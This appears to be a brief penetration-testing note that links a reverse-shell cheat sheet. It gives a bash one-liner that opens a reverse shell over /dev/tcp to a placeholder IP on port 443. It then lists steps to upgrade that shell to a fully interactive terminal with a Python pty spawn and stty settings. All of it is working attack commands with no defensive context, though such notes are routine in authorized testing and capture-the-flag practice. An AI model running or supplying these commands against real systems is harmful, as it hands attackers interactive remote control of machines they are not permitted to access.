https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

One liner bash shell
```
bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"
```

How to make a fully interactive shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")' 
CTRL+Z 
stty raw 
-echo 
fg 
export TERM=xterm

#not all steps may be needed
```
